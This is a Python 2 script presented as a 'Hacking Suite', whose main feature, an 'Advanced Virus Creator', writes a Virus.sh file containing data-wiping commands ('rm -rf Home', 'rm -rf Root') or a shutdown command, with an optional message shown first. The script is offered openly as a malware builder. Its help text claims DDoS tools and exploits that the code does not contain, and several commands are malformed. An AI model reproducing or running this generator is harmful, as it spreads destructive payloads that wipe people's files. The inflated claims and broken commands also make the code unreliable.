import time
import os
import sys
#Presentation-------------------------------------------------------------------
print """
 __    __       ___       ______  __  ___  __  .__   __.   _______ 
|  |  |  |     /   \     /      ||  |/  / |  | |  \ |  |  /  _____|
|  |__|  |    /  ^  \   |  ,----'|  '  /  |  | |   \|  | |  |  __  
|   __   |   /  /_\  \  |  |     |    <   |  | |  . `  | |  | |_ | 
|  |  |  |  /  _____  \ |  `----.|  .  \  |  | |  |\   | |  |__| | 
|__|  |__| /__/     \__\ \______||__|\__\ |__| |__| \__|  \______| 
                                                                   
     _______. __    __   __  .___________. _______ 
    /       ||  |  |  | |  | |           ||   ____|
   |   (----`|  |  |  | |  | `---|  |----`|  |__   
    \   \    |  |  |  | |  |     |  |     |   __|  
.----)   |   |  `--'  | |  |     |  |     |  |____ 
|_______/     \______/  |__|     |__|     |_______|
                                                   
"""

print "--------------------------------------------+"
print "welcome to Hacking Suite                    >"
print "For help press HELP                         >"
print "For a list of all commands press COM        >"
print "For a list of tools press TS                >"
print "--------------------------------------------+"
#MAIN LOOP----------------------------------------------------------------------
while True:
    command = raw_input("Ready {=> ")
#HELP COMMAND-------------------------------------------------------------------
    if command == "HELP":
        print """
+------------/ Help and credits \-----------------+
+Hacking Suite version 1.0 {under develepoment}   +
+By El Sonador,kwnos100,Shellstorm Xcode          +
+The Hacking Suite project is a bash with a lot of+
+hacking possibilities like encrupt/deptypt virus +
+creator also have DDOS tools and a lot of small  +
+exploits                                         +
+-------------------------------------------------+
"""
#COM COMMAND---------------------------------------------------------------------
    if command == "COM":
        print """
+               </-H-S Commands-\>                  +
+---------------------------------------------------+
+ COM   = Shows a list of all the H-S commands      +
+ AVC   = Activates the Advanced Virus Creator      +
+ AVCOM = Shows the AVC commands                    +
+ EXIT  = Exits from Hacking Suite                  +
+---------------------------------------------------+
"""
#TS COMMAND----------------------------------------------------------------------
    if command == "TS":
        print """
+             </Tools\>                       +
+---------------------------------------------+
+ AVC               ADVANCED VIRUS CREATOR    +
+---------------------------------------------+
"""
#AVCOM COMMAND---------------------------------------------------------------------
    if command == "AVCOM":
        print """
+-------------------------------------------------------------------------+
+Dcreate_virus_text  = Creates message virus who delete all personal data +
+Dcreate_virus       = Creates virus who delete all personal data         +
+D2create_virus_text = Create messages virus who deletes all root folder  +
+D2create_virus      = Create virus who deletes all root folder           +
+Icreate_virus       = Creates simple message and shutdown virus          +
+-------------------------------------------------------------------------+
"""
#EXIT COMMAND-------------------------------------------------------------------
    if command == "EXIT":
        print "Thank you for using Hacking suite"
        time.sleep(3)
        sys.exit()
    
#AVC MAIN FUCTIONS----------------------------------------------------------------
    if command == "AVC":
        def D_create_virus(parameter,message,text):
            if parameter == 1:
                if message == 1:
                    D_Virus = open("Virus.sh", "wb")
                    D_Virus.write("Echo " + text + os.linesep + "sleep -s 5" + os.linesep + "rm -rf Home");
                    D_Virus.close() 
                if message == 2:
                    D_Virus = open("Virus.sh", "wb")
                    D_Virus.write("rm -rf Home");
                    D_Virus.close()
            if parameter == 2:
                if message == 1:
                    D_Virus = open("Virus.sh", "wb")
                    D_Virus.write("Echo " + text + os.linesep + "sleep -s 5" + os.linesep + "rm -rf Root");
                    D_Virus.close()
                if message ==2:
                    D_Virus = open("Virus.sh", "wb")
                    D_Virus.write("rm -rf Root");
                    D_Virus.close()
        def I_create_virus(text):
            I_Virus = open("Virus.sh", "wb")
            I_Virus.write("shutdown -k " + text)
            I_Virus.close()        
#MAIN SOURCE CODE------------------------------------------------------------------
        com = raw_input("AVC Ready {=> ")
        if com == "Dcreate_virus_text":
            text = raw_input("Message ~ ")
            D_create_virus(1,1,text)
            print "Virus Created on current directory"
        if com == "Dcreate_virus":
            D_create_virus(1,2,"")
            print "Virus Created on current directory"
        if com == "D2create_virus_text":
            text = raw_input("Message ~ ")
            D_create_virus(2,1,text)
            print "Virus Created on current directory"
        if com == "D2create_virus":
            D_create_virus(2,2,"")
            print "Virus Created on current directory"
        if com == "Icreate_virus_text":
            text = raw_input("Message")
            I_create_virus(text)
            
#Another programms-----------------------------------------------------------------


